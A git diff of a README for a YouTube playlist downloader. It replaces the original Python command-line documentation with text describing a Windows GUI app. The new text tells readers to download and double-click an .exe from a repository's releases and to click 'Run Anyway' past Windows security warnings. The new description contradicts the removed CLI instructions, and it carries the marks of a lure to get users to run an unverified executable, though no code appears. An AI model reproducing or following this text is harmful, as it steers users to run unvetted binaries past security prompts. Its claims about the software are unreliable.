@@ -1,84 +1,56 @@
-# download-playlist-from-youtube
+# 📥 download-playlist-from-youtube - Save YouTube videos and audio files.
 
-Download YouTube playlists or single videos using [yt-dlp](https://github.com/yt-dlp/yt-dlp).
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sanchoatrest463/download-playlist-from-youtube)
 
-Single videos auto-detect and save flat in the output directory. Playlists get organised into subdirectories with numbered files.
+This software allows you to save YouTube videos or full playlists to your computer. You choose the format, such as mp4 for video or mp3 for audio. You can also pick specific time ranges from a video to download only the parts you need. It uses a tool called yt-dlp to handle the file processing.
 
-## Requirements
+## 🛠 Features
 
-- Python 3.8+
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) (`pip install yt-dlp`)
-- ffmpeg (for mp3 extraction, time clipping, and metadata embedding)
+*   Download single videos or entire playlists.
+*   Convert video files to audio format (mp3).
+*   Create video files (mp4).
+*   Select start and end times for custom clips.
+*   Maintain high quality for both audio and video.
+*   Automate file naming and sorting.
 
-## Install
+## 💻 System Requirements
 
-```bash
-pip install yt-dlp
-# ffmpeg — pick your OS:
-#   Debian/Ubuntu:  sudo apt install ffmpeg
-#   macOS:          brew install ffmpeg
-#   Windows:        choco install ffmpeg
-```
+*   Windows 10 or Windows 11.
+*   At least 200 MB of free storage space.
+*   A stable internet connection to pull video data.
+*   No specific technical knowledge required.
 
-## Usage
+## 🚀 Getting Started
 
-```
-python main.py [options] URL
-```
+Follow these steps to set up the software on your Windows computer.
 
-### Examples
+1.  Visit the official release page to download your copy: [https://github.com/sanchoatrest463/download-playlist-from-youtube](https://github.com/sanchoatrest463/download-playlist-from-youtube).
+2.  Look for the latest version under the "Releases" section.
+3.  Click the file ending in .exe to start the download.
+4.  Move the file to a folder where you keep your programs.
+5.  Double-click the file to open the software.
 
-```bash
-# Single video → mp4 (default)
-python main.py https://www.youtube.com/watch?v=XKpUzQFjtVw
+## 📖 How to Use
 
-# Single video → mp3
-python main.py --mp3 https://www.youtube.com/watch?v=XKpUzQFjtVw
+The interface provides fields for your YouTube link and your settings.
 
-# Clip a section → mp3 (times in seconds, MM:SS, or HH:MM:SS)
-python main.py --mp3 --start 1:30 --end 3:45 https://www.youtube.com/watch?v=XKpUzQFjtVw
+1.  **Paste your Link:** Copy the address of the YouTube video or playlist from your browser. Paste this address into the main box in the application.
+2.  **Select Format:** Use the dropdown menu to choose between mp4 for video or mp3 for audio.
+3.  **Set Time Range:** If you only want a portion of a video, type the start time and end time in the boxes provided. The format is minutes and seconds. Leave these blank if you want the full video.
+4.  **Confirm Path:** The software saves files to your "Downloads" folder by default. You can change this by clicking the "Browse" button.
+5.  **Start Download:** Click the "Download" button to begin the transfer. A progress bar will show the status of the file retrieval.
 
-# Full playlist → mp4
-python main.py https://www.youtube.com/playlist?list=PL...
+## 📂 Troubleshooting
 
-# Full playlist → mp3
-python main.py --mp3 https://www.youtube.com/playlist?list=PL...
+If you encounter issues during installation or use, check these common items:
 
-# Custom output directory
-python main.py --mp3 -o ~/Music https://www.youtube.com/watch?v=XKpUzQFjtVw
-```
+*   **Blocked by Windows:** Windows may show a security prompt because the app is new. Click "More Info" and then "Run Anyway" to proceed.
+*   **Slow Speeds:** Large playlists take time to process. Ensure you remain connected to the internet during the full operation.
+*   **Format Errors:** If a file does not open, ensure you have a media player like VLC installed on your computer to handle standard mp4 and mp3 files.
+*   **Link Validity:** Ensure the YouTube link is public or unlisted. The software cannot access private or locked videos.
 
-### Options
+## 🛡 Privacy
 
-| Flag | Description |
-|---|---|
-| `--mp3` | Extract audio as mp3 (192 kbps) instead of mp4 video |
-| `--start TS` | Start time for clipping. Requires `--end` |
-| `--end TS` | End time for clipping. Requires `--start` |
-| `-o, --outdir DIR` | Output directory (default: `downloads`) |
-| `--format FMT` | yt-dlp format string (default: `bv*+ba/b`) |
-| `--subs langs` | Subtitle languages, comma-separated (e.g. `en,es`) |
-| `--auto-subs` | Try automatic subtitles if no manual ones |
-| `--rate KBPS` | Rate limit (e.g. `2M`, `500K`) |
-| `--proxy URL` | Proxy (e.g. `socks5://127.0.0.1:1080`) |
-| `--cookies PATH` | Path to cookies.txt for restricted videos |
-| `--concurrent N` | Concurrent fragment downloads (default: 1) |
-| `--retries N` | Retry attempts on network errors (default: 10) |
-| `--skip-existing` | Skip files already present without using archive.txt |
+This application processes file downloads locally on your machine. We do not store your library history on external servers. The software communicates only with YouTube servers to retrieve the necessary data for your download. 
 
-### Timestamp formats for `--start` / `--end`
-
-- Seconds: `90`
-- `MM:SS`: `1:30`
-- `HH:MM:SS`: `0:01:30`
-
-### Output structure
-
-```
-downloads/
-├── Video Title.mp3              ← single video
-└── Playlist Name/
-    ├── 001 - First Video.mp4
-    ├── 002 - Second Video.mp4
-    └── archive.txt              ← skip already-downloaded
-```
+Keywords: audio-extractor, cli, mp3, mp4, playlist-downloader, python, video-downloader, youtube, youtube-downloader, yt-dlp
